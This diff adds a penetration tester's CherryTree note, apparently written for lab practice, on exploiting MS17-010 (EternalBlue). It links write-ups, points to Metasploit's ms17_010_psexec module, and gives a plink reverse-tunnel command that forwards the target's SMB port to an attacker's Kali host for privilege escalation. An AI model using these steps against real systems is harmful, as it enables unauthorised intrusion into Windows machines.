@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>MS17-010</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>MS17-010</h1><br/><a href="https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8">https://medium.com/@ranakhalil101/hack-the-box-blue-writeup-w-o-metasploit-572c6042feb8</a><br /><a href="https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/">https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/</a><br />^^these only work if the guest account is active OR you have a username with creds. Otherwise, use metasploits exploit/windows/smb/ms17_010_psexec<br /><br />if being used for privesc, to open port 445 to your kali<br />    put plink.exe on target machine<br />    plink -R 445:localhost:445 root@kaliip      to <strong>forward 445</strong> traffic on the <strong>localhost </strong>to 445 on <strong>10.11.0.186</strong>   <br />    nmap -p 445 127.0.0.1 to verify 445 connectivity</div></body></html>
